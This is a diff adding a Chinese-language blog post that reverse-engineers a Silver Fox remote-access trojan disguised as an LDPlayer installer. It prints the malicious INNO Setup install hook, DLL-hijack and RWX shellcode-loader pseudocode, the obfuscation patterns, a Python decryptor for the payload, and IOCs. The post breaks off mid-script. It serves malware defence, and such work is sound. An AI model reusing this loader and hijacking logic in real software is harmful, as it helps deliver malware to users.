@@ -1,0 +1,1181 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTTPS隧道里的银狐：DoH隐蔽通信木马全链路逆向分析——从样本提取到IOC提取 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>HTTPS隧道里的银狐：DoH隐蔽通信木马全链路逆向分析——从样本提取到IOC提取</h1>
+<time>2026-07-25</time>
+<p><span class="tag">安全</span><span class="tag">逆向分析</span><span class="tag">恶意软件</span><span class="tag">DoH</span><span class="tag">银狐</span></p>
+<h1>HTTPS隧道里的银狐：DoH隐蔽通信木马全链路逆向分析——从样本提取到IOC提取</h1>
+<h2>一、概述</h2>
+<p>在近期的一次应急响应事件中，我们捕获了一个伪装为雷电模拟器安装程序的高危木马样本。该样本采用被篡改的 INNO Setup 打包程序作为初始投放载体，通过经典的"白加黑"（DLL Search Order Hijacking）技术释放恶意载荷，并最终加载功能强大的"银狐"远控木马。</p>
+<p>本篇博客将从恶意样本的初始分析出发，逐步深入逆向其白加黑 DLL 劫持机制、shellcode 解密算法、基于 DNS over HTTPS（DoH）的隐蔽通信协议、键盘记录模块、凭据窃取模块以及 RC4 加密引擎，最终给出完整的 IOC（Indicators of Compromise）提取清单。</p>
+<p><strong>样本基本信息表：</strong></p>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>原始文件名</td>
+<td><code>ldplayer9_ld_112_ld.exe</code></td>
+</tr>
+<tr>
+<td>MD5</td>
+<td><code>8c4fc902905459a53f686372a1a85526</code></td>
+</tr>
+<tr>
+<td>打包器</td>
+<td>篡改的 INNO Setup</td>
+</tr>
+<tr>
+<td>伪装对象</td>
+<td>雷电模拟器（LDPlayer 9）</td>
+</tr>
+<tr>
+<td>最终载荷</td>
+<td>银狐远控木马（VMProtect 保护）</td>
+</tr>
+<tr>
+<td>通信方式</td>
+<td>DoH / TCP 自定义协议 / 标准 HTTPS</td>
+</tr>
+</tbody>
+</table>
+<p><strong>攻击链全景流程图：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="n">┌──────────────────────────────────────────────────────────────┐</span>
+<span class="n">│                    银狐木马全链路攻击流程                       │</span>
+<span class="n">├──────────────────────────────────────────────────────────────┤</span>
+<span class="n">│                                                              │</span>
+<span class="n">│  [1] 初始投放                                                  │</span>
+<span class="n">│  ┌─────────────────┐                                        │</span>
+<span class="n">│  │ ldplayer9_ld_    │  INNO Setup 安装程序                   │</span>
+<span class="n">│  │ 112_ld.exe      │  (被篡改)                               │</span>
+<span class="n">│  └────────┬────────┘                                        │</span>
+<span class="n">│           │ 运行安装                                          │</span>
+<span class="n">│           ▼                                                  │</span>
+<span class="n">│  [2] 释放恶意组件                                              │</span>
+<span class="n">│  ┌─────────────────┐                                        │</span>
+<span class="n">│  │ 释放 wjcapture.  │  白加黑 DLL 劫持载体                     │</span>
+<span class="n">│  │ dll + 白色EXE    │                                        │</span>
+<span class="n">│  └────────┬────────┘                                        │</span>
+<span class="n">│           │ DLL Search Order Hijacking                       │</span>
+<span class="n">│           ▼                                                  │</span>
+<span class="n">│  [3] 加载与解密                                                │</span>
+<span class="n">│  ┌─────────────────┐                                        │</span>
+<span class="n">│  │ 读取 Update.xml  │  读取加密配置                            │</span>
+<span class="n">│  │ 解密 Shellcode   │  XOR 循环解密                           │</span>
+<span class="n">│  └────────┬────────┘                                        │</span>
+<span class="n">│           │ 解密完成                                          │</span>
+<span class="n">│           ▼                                                  │</span>
+<span class="n">│  [4] 执行 Shellcode                                           │</span>
+<span class="n">│  ┌─────────────────┐                                        │</span>
+<span class="n">│  │ 内存执行         │  Shellcode Loader                       │</span>
+<span class="n">│  │ 进程镂空注入     │  Process Hollowing                      │</span>
+<span class="n">│  └────────┬────────┘                                        │</span>
+<span class="n">│           │ 注入成功                                          │</span>
+<span class="n">│           ▼                                                  │</span>
+<span class="n">│  [5] 银狐核心模块运行                                          │</span>
+<span class="n">│  ┌─────────────────────────────────────────┐                │</span>
+<span class="n">│  │  VMProtect 虚拟化保护 (67% 函数)         │                │</span>
+<span class="n">│  │  ┌─────────┐ ┌──────────┐ ┌─────────┐  │                │</span>
+<span class="n">│  │  │Fuck()入口│→│键盘记录  │→│凭据窃取  │  │                │</span>
+<span class="n">│  │  └─────────┘ └──────────┘ └─────────┘  │                │</span>
+<span class="n">│  │  ┌──────────────────────────────┐      │                │</span>
+<span class="n">│  │  │DoH 隐蔽通信 (HTTPS隧道)       │      │                │</span>
+<span class="n">│  │  │oidng2.duoshit.com             │      │                │</span>
+<span class="n">│  │  └──────────────────────────────┘      │                │</span>
+<span class="n">│  └─────────────────────────────────────────┘                │</span>
+<span class="n">│           │                                                  │</span>
+<span class="n">│           ▼                                                  │</span>
+<span class="n">│  [6] C2 通信                                                  │</span>
+<span class="n">│  ┌─────────────────────────────────────────┐                │</span>
+<span class="n">│  │ DoH: 223.5.5.5 / 8.8.8.8               │                │</span>
+<span class="n">│  │ 备用: TCP 自定义协议 / 标准 HTTPS         │                │</span>
+<span class="n">│  └─────────────────────────────────────────┘                │</span>
+<span class="n">│                                                              │</span>
+<span class="n">└──────────────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<hr />
+<h2>二、初始样本分析</h2>
+<h3>2.1 文件基本信息</h3>
+<p>样本原始文件名为 <code>ldplayer9_ld_112_ld.exe</code>，伪装为雷电模拟器（LDPlayer 9）的安装程序。通过文件头和节区信息可以确认这是一个被篡改的 INNO Setup 打包程序。</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>file<span class="w"> </span>ldplayer9_ld_112_ld.exe
+ldplayer9_ld_112_ld.exe:<span class="w"> </span>PE32+<span class="w"> </span>executable<span class="w"> </span><span class="o">(</span>GUI<span class="o">)</span><span class="w"> </span>x86-64,<span class="w"> </span><span class="m">5</span><span class="w"> </span>sections
+
+$<span class="w"> </span>md5sum<span class="w"> </span>ldplayer9_ld_112_ld.exe
+8c4fc902905459a53f686372a1a85526<span class="w">  </span>ldplayer9_ld_112_ld.exe
+</code></pre></div>
+
+<h3>2.2 INNO Setup 结构分析</h3>
+<p>正常的 INNO Setup 安装程序在 <code>[Setup]</code> 段中包含合法的应用程序信息。本样本同样保留了 INNO Setup 的基本结构，但在 <code>[Code]</code> 段中嵌入恶意代码，在安装过程中释放额外的恶意组件：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 恶意样本中 [Code] 段的伪代码还原</span>
+<span class="k">procedure</span><span class="w"> </span><span class="nf">CurStepChanged</span><span class="p">(</span><span class="n">CurStep</span><span class="o">:</span><span class="w"> </span><span class="n">TSetupStep</span><span class="p">)</span><span class="o">;</span>
+<span class="k">var</span>
+<span class="w">    </span><span class="n">ResultCode</span><span class="o">:</span><span class="w"> </span><span class="kt">Integer</span><span class="o">;</span>
+<span class="k">begin</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">CurStep</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ssInstall</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span><span class="k">begin</span>
+<span class="w">        </span><span class="c1">// 释放白加黑组件到安装目录</span>
+<span class="w">        </span><span class="n">ExtractTemporaryFile</span><span class="p">(</span><span class="s">&#39;wjcapture.dll&#39;</span><span class="p">)</span><span class="o">;</span><span class="w">  </span><span class="c1">// 恶意 DLL</span>
+<span class="w">        </span><span class="n">ExtractTemporaryFile</span><span class="p">(</span><span class="s">&#39;LDPlayer.exe&#39;</span><span class="p">)</span><span class="o">;</span><span class="w">    </span><span class="c1">// 白色可执行文件</span>
+<span class="w">        </span><span class="c1">// 静默执行</span>
+<span class="w">        </span><span class="n">Exec</span><span class="p">(</span><span class="n">ExpandConstant</span><span class="p">(</span><span class="s">&#39;{tmp}\LDPlayer.exe&#39;</span><span class="p">)</span><span class="o">,</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="o">,</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="o">,</span><span class="w"> </span><span class="n">SW_HIDE</span><span class="o">,</span>
+<span class="w">             </span><span class="n">ewWaitUntilTerminated</span><span class="o">,</span><span class="w"> </span><span class="n">ResultCode</span><span class="p">)</span><span class="o">;</span>
+<span class="w">    </span><span class="k">end</span><span class="o">;</span>
+<span class="k">end</span><span class="o">;</span>
+</code></pre></div>
+
+<h3>2.3 释放组件概览</h3>
+<p>安装过程释放的核心恶意组件如下：</p>
+<table>
+<thead>
+<tr>
+<th>文件名</th>
+<th>角色</th>
+<th>MD5</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>wjcapture.dll</code></td>
+<td>恶意 DLL（黑DLL）</td>
+<td><code>319c718edc390a304acb0bc8886e0da5</code></td>
+</tr>
+<tr>
+<td><code>LDPlayer.exe</code></td>
+<td>白色可执行文件</td>
+<td>合法雷电模拟器主程序</td>
+</tr>
+<tr>
+<td><code>Update.xml</code></td>
+<td>加密的 Shellcode 载荷</td>
+<td>随样本变化</td>
+</tr>
+</tbody>
+</table>
+<p><code>wjcapture.dll</code> 借用了 <code>jcapture.dll</code>（一个 Java 屏幕捕获组件）的名称前缀进行伪装，通过 DLL 搜索顺序劫持被 <code>LDPlayer.exe</code> 加载。</p>
+<hr />
+<h2>三、白加黑 DLL 劫持深度分析</h2>
+<h3>3.1 DLL 搜索顺序劫持原理</h3>
+<p>Windows 程序加载 DLL 时遵循固定的搜索顺序，攻击者正是利用这一机制实现"白加黑"劫持：</p>
+<div class="highlight"><pre><span></span><code>DLL 搜索顺序：
+  1. 应用程序所在目录  ← 恶意 DLL 被放置于此
+  2. 系统目录 (System32)
+  3. Windows 目录
+  4. 当前工作目录
+  5. PATH 环境变量中的目录
+</code></pre></div>
+
+<p>当合法的 <code>LDPlayer.exe</code> 启动并尝试加载 <code>jcapture.dll</code> 时，由于 <code>wjcapture.dll</code> 已被释放在同一目录，且名称匹配，系统优先加载了恶意 DLL。</p>
+<h3>3.2 wjcapture.dll 的垃圾指令对抗</h3>
+<p><code>wjcapture.dll</code> 的 <code>DllMain</code> 和解密函数中大量使用垃圾指令（Junk Code）来对抗静态分析工具和逆向工程师。经过系统化分析，共识别出 <strong>7 类垃圾指令模式</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>类别</th>
+<th>指令示例</th>
+<th>特征描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>BCD 算术指令</td>
+<td><code>aad 0xFF</code> / <code>aam 0x0A</code> / <code>aaa</code> / <code>daa</code> / <code>das</code></td>
+<td>非十进制调整指令，不产生有效副作用</td>
+</tr>
+<tr>
+<td>死标志操作</td>
+<td><code>pushf</code> / <code>popf</code> / <code>lahf</code> / <code>clc</code> / <code>stc</code></td>
+<td>修改标志寄存器但结果未被使用</td>
+</tr>
+<tr>
+<td>死位操作</td>
+<td><code>btc/btr/bts/bt/bswap</code></td>
+<td>位测试/操作指令，对无关寄存器执行</td>
+</tr>
+<tr>
+<td>无意义比较</td>
+<td><code>cmp eax, eax</code> / <code>test ecx, ecx</code>（后无 jcc）</td>
+<td>比较结果不影响控制流</td>
+</tr>
+<tr>
+<td>虚假栈操作</td>
+<td><code>push 0xDEAD; lea esp, [esp+4]</code></td>
+<td>入栈后立即调整栈指针，等价于 NOP</td>
+</tr>
+<tr>
+<td>花指令</td>
+<td><code>jmp $+5; db 0xE8, 0x00, 0x00, 0x00, 0x00</code></td>
+<td>跳过垃圾字节，模拟函数调用</td>
+</tr>
+<tr>
+<td>无意义移位</td>
+<td><code>shld/shrd/rol/ror</code></td>
+<td>对无关寄存器执行移位操作</td>
+</tr>
+</tbody>
+</table>
+<p>以下是一段典型的垃圾指令片段（从 <code>wjcapture.dll</code> 的 DllMain 中提取）：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">; wjcapture.dll DllMain 中的垃圾指令片段</span>
+<span class="c1">; 地址: 0x1800012A0</span>
+<span class="nf">pushf</span><span class="w">                    </span><span class="c1">; [死标志操作] 保存标志位</span>
+<span class="nf">pop</span><span class="w">  </span><span class="no">eax</span><span class="w">                 </span><span class="c1">; 弹出到 eax（结果未使用）</span>
+<span class="nf">das</span><span class="w">                      </span><span class="c1">; [BCD算术] 无意义的十进制调整</span>
+<span class="nf">btc</span><span class="w">  </span><span class="no">ecx</span><span class="p">,</span><span class="w"> </span><span class="mi">0x1F</span><span class="w">          </span><span class="c1">; [死位操作] 测试并取反 ecx[31]</span>
+<span class="nf">push</span><span class="w"> </span><span class="mi">0xBEEF</span><span class="w">              </span><span class="c1">; [虚假栈操作] 压入无用值</span>
+<span class="nf">lea</span><span class="w">  </span><span class="no">esp</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">4</span><span class="p">]</span><span class="w">        </span><span class="c1">; 立即调整栈指针（等价于NOP）</span>
+<span class="nf">cmp</span><span class="w">  </span><span class="no">edx</span><span class="p">,</span><span class="w"> </span><span class="no">edx</span><span class="w">            </span><span class="c1">; [无意义比较] 自身比较，后无 jcc</span>
+<span class="nf">ror</span><span class="w">  </span><span class="no">ebx</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="w">              </span><span class="c1">; [无意义移位] 旋转 ebx（结果未使用）</span>
+<span class="nf">jmp</span><span class="w">  </span><span class="no">$</span><span class="err">+</span><span class="mi">5</span><span class="w">                 </span><span class="c1">; [花指令] 跳过下一条指令</span>
+<span class="nf">db</span><span class="w">   </span><span class="mi">0xE8</span><span class="p">,</span><span class="w"> </span><span class="mi">0x00</span><span class="p">,</span><span class="w"> </span><span class="mi">0x00</span><span class="p">,</span><span class="w"> </span><span class="mi">0x00</span><span class="p">,</span><span class="w"> </span><span class="mi">0x00</span><span class="w">  </span><span class="c1">; 被跳过的垃圾字节</span>
+<span class="nf">aad</span><span class="w"> </span><span class="mi">0xFF</span><span class="w">                 </span><span class="c1">; [BCD算术] 无意义的ASCII调整</span>
+</code></pre></div>
+
+<p><strong>识别方法：</strong> 对于每条指令，检查其操作结果是否被后续指令引用。若操作数（如 <code>eax</code>）在下一引用点之前被覆写，则该指令为垃圾指令。在 IDA Pro / Ghidra 中可编写脚本自动标记此类指令。</p>
+<h3>3.3 DllMain 执行流程</h3>
+<p>清理垃圾指令后，<code>DllMain</code> 的核心逻辑清晰可见：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">; 清理垃圾指令后的 DllMain 伪代码</span>
+<span class="nf">DllMain</span><span class="p">(</span><span class="no">HINSTANCE</span><span class="w"> </span><span class="no">hinstDLL</span><span class="p">,</span><span class="w"> </span><span class="no">DWORD</span><span class="w"> </span><span class="no">fdwReason</span><span class="p">,</span><span class="w"> </span><span class="no">LPVOID</span><span class="w"> </span><span class="no">lpReserved</span><span class="p">)</span>
+<span class="err">{</span>
+<span class="w">    </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="no">fdwReason</span><span class="w"> </span><span class="err">==</span><span class="w"> </span><span class="no">DLL_PROCESS_ATTACH</span><span class="p">)</span>
+<span class="w">    </span><span class="err">{</span>
+<span class="w">        </span><span class="c1">// 1. 获取当前模块路径</span>
+<span class="w">        </span><span class="nf">GetModuleFileNameA</span><span class="p">(</span><span class="no">hinstDLL</span><span class="p">,</span><span class="w"> </span><span class="no">szPath</span><span class="p">,</span><span class="w"> </span><span class="no">MAX_PATH</span><span class="p">)</span><span class="c1">;</span>
+
+<span class="w">        </span><span class="c1">// 2. 构造 Update.xml 路径（同目录下）</span>
+<span class="w">        </span><span class="c1">//    将 szPath 末尾替换为 &quot;Update.xml&quot;</span>
+
+<span class="w">        </span><span class="c1">// 3. 读取 Update.xml 全部内容到缓冲区</span>
+
+<span class="w">        </span><span class="c1">// 4. 调用解密函数处理缓冲区中的 Shellcode</span>
+
+<span class="w">        </span><span class="c1">// 5. 分配 RWX 内存并执行解密后的 Shellcode</span>
+<span class="w">        </span><span class="nf">VirtualAlloc</span><span class="p">(</span><span class="no">NULL</span><span class="p">,</span><span class="w"> </span><span class="no">dwSize</span><span class="p">,</span><span class="w"> </span><span class="no">MEM_COMMIT</span><span class="p">,</span><span class="w"> </span><span class="no">PAGE_EXECUTE_READWRITE</span><span class="p">)</span><span class="c1">;</span>
+<span class="w">        </span><span class="nf">memcpy</span><span class="p">(</span><span class="no">pExecBuf</span><span class="p">,</span><span class="w"> </span><span class="no">pDecrypted</span><span class="p">,</span><span class="w"> </span><span class="no">dwSize</span><span class="p">)</span><span class="c1">;</span>
+<span class="w">        </span><span class="nf">pExecBuf</span><span class="p">()</span><span class="c1">;  // 跳转执行</span>
+<span class="w">    </span><span class="err">}</span>
+<span class="w">    </span><span class="nf">return</span><span class="w"> </span><span class="no">TRUE</span><span class="c1">;</span>
+<span class="err">}</span>
+</code></pre></div>
+
+<hr />
+<h2>四、解密函数逆向还原</h2>
+<h3>4.1 算法核心逻辑</h3>
+<p>解密函数是 <code>wjcapture.dll</code> 中最关键的部分，负责将 <code>Update.xml</code> 中的加密数据还原为可执行的 Shellcode。通过动态调试和静态分析，完整还原了其解密算法。</p>
+<p><strong>算法步骤：</strong></p>
+<ol>
+<li><strong>种子生成：</strong> <code>seed = 前4字节密文 XOR 文件大小</code></li>
+<li><strong>循环解密：</strong> 从第 5 字节开始（index=4），逐字节执行：</li>
+<li><code>seed += 0x7F</code>（编译器将其拆分为 <code>0x0C + 0x35 + 0x3E</code> 以隐藏常量）</li>
+<li><code>data[i] = data[i] XOR (BYTE)seed</code></li>
+</ol>
+<h3>4.2 汇编级分析</h3>
+<p>以下是从 <code>wjcapture.dll</code> 中提取的解密函数核心汇编代码：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">; 解密函数 - 地址: 0x180002340</span>
+<span class="c1">; 输入: eax = 文件大小, ecx = 密文缓冲区指针</span>
+
+<span class="nf">mov</span><span class="w">  </span><span class="no">esi</span><span class="p">,</span><span class="w"> </span><span class="no">ecx</span><span class="w">              </span><span class="c1">; esi = 密文缓冲区基址</span>
+<span class="nf">mov</span><span class="w">  </span><span class="no">edi</span><span class="p">,</span><span class="w"> </span><span class="no">esi</span><span class="w">              </span><span class="c1">; edi = 解密写入位置</span>
+
+<span class="c1">; Step 1: 计算种子</span>
+<span class="nf">mov</span><span class="w">  </span><span class="no">ebx</span><span class="p">,</span><span class="w"> </span><span class="no">dword</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">esi</span><span class="p">]</span><span class="w">  </span><span class="c1">; ebx = 前4字节密文</span>
+<span class="nf">xor</span><span class="w">  </span><span class="no">ebx</span><span class="p">,</span><span class="w"> </span><span class="no">eax</span><span class="w">              </span><span class="c1">; seed = ebx ^ fileSize</span>
+<span class="nf">mov</span><span class="w">  </span><span class="no">edx</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">                </span><span class="c1">; edx 用作循环计数器</span>
+
+<span class="nl">decrypt_loop:</span>
+<span class="nf">cmp</span><span class="w">  </span><span class="no">edx</span><span class="p">,</span><span class="w"> </span><span class="no">eax</span><span class="w">              </span><span class="c1">; 比较: 计数器 vs 文件大小</span>
+<span class="nf">jge</span><span class="w">  </span><span class="no">decrypt_done</span><span class="w">          </span><span class="c1">; 解密完成</span>
+
+<span class="c1">; Step 2: 种子递增（隐藏常量 0x7F = 0x0C + 0x35 + 0x3E）</span>
+<span class="nf">add</span><span class="w">  </span><span class="no">ebx</span><span class="p">,</span><span class="w"> </span><span class="mi">0x0C</span><span class="w">             </span><span class="c1">; 隐藏常量拆分 #1</span>
+<span class="nf">add</span><span class="w">  </span><span class="no">ebx</span><span class="p">,</span><span class="w"> </span><span class="mi">0x35</span><span class="w">             </span><span class="c1">; 隐藏常量拆分 #2</span>
+<span class="nf">add</span><span class="w">  </span><span class="no">ebx</span><span class="p">,</span><span class="w"> </span><span class="mi">0x3E</span><span class="w">             </span><span class="c1">; 隐藏常量拆分 #3</span>
+<span class="w">                              </span><span class="c1">; 等价于: add ebx, 0x7F</span>
+
+<span class="c1">; Step 3: XOR 解密当前字节</span>
+<span class="nf">movzx</span><span class="w"> </span><span class="no">ecx</span><span class="p">,</span><span class="w"> </span><span class="no">bl</span><span class="w">              </span><span class="c1">; ecx = (BYTE)seed (取低8位)</span>
+<span class="nf">xor</span><span class="w">  </span><span class="no">byte</span><span class="w"> </span><span class="no">ptr</span><span class="w"> </span><span class="p">[</span><span class="no">edi</span><span class="err">+</span><span class="no">edx</span><span class="p">],</span><span class="w"> </span><span class="no">cl</span><span class="w"> </span><span class="c1">; data[edx] ^= (BYTE)seed</span>
+
+<span class="nf">inc</span><span class="w">  </span><span class="no">edx</span><span class="w">                   </span><span class="c1">; 计数器++</span>
+<span class="nf">jmp</span><span class="w">  </span><span class="no">decrypt_loop</span><span class="w">          </span><span class="c1">; 继续循环</span>
+
+<span class="nl">decrypt_done:</span>
+<span class="nf">ret</span>
+</code></pre></div>
+
+<p><strong>关键技术细节：</strong> 常量 <code>0x7F</code> 被拆分为三个加法操作 <code>add ebx, 0x0C</code> / <code>add ebx, 0x35</code> / <code>add ebx, 0x3E</code>，这是一种常见的反静态分析技巧。手动计算验证：<code>0x0C + 0x35 + 0x3E = 0x7F</code>，完全吻合。</p>
+<h3>4.3 C 语言等效实现</h3>
+<div class="highlight"><pre><span></span><code><span class="cm">/*</span>
+<span class="cm"> * wjcapture.dll Shellcode 解密函数</span>
+<span class="cm"> * 参数: data - Update.xml 原始数据缓冲区</span>
+<span class="cm"> *       size - 文件大小（字节数）</span>
+<span class="cm"> */</span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">decrypt_shellcode</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">size</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w">  </span><span class="c1">// 最少需要 4 字节头 + 至少 1 字节数据</span>
+
+<span class="w">    </span><span class="cm">/* Step 1: 计算种子 = 前4字节密文 XOR 文件大小 */</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">seed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">size</span><span class="p">;</span>
+
+<span class="w">    </span><span class="cm">/* Step 2: 逐字节解密（跳过前4字节种子区域）*/</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">size</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="n">seed</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mh">0x7F</span><span class="p">;</span><span class="w">                          </span><span class="c1">// 隐藏常量 0x0C+0x35+0x3E</span>
+<span class="w">        </span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="p">)(</span><span class="n">seed</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">);</span><span class="w"> </span><span class="c1">// 取 seed 低 8 位做 XOR</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>4.4 Python 解密脚本</h3>
+<p>以下是可直接使用的 Python 解密工具，用于批量处理 <code>Update.xml</code> 文件并提取 Shellcode：</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">wjcapture.dll Update.xml Shellcode 解密工具</span>
+<span class="sd">用法: python3 decrypt_update.py &lt;update.xml&gt; &lt;output.bin&gt;</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">decrypt_shellcode</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    解密 wjcapture.dll 使用的 Update.xml 载荷</span>
+
+<span class="sd">    算法:</span>
+<span class="sd">      1. seed = 前4字节密文 XOR 文件大小</span>
+<span class="sd">      2. 从第5字节开始循环:</span>
+<span class="sd">         - seed += 0x7F</span>
+<span class="sd">         - data[i] ^= (seed &amp; 0xFF)</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">size</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;文件过小 (</span><span class="si">{</span><span class="n">size</span><span class="si">}</span><span class="s2"> 字节), 无法解密&quot;</span><span class="p">)</span>
+
+    <span class="c1"># Step 1: 计算种子</span>
+    <span class="n">seed</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">size</span>
+
+    <span class="c1"># Step 2: 逐字节解密</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+        <span class="n">seed</span> <span class="o">+=</span> <span class="mh">0x7F</span>
+        <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="p">(</span><span class="n">seed</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;用法: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> &lt;input.xml&gt; &lt;output.bin&gt;&quot;</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">input_path</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">output_path</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">input_path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">encrypted_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 读取文件: </span><span class="si">{</span><span class="n">input_path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 文件大小: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span><span class="si">}</span><span class="s2"> 字节&quot;</span><span class="p">)</span>
+
+    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">decrypt_shellcode</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>
+
+    <span class="c1"># 简单的 Shellcode 特征检测</span>
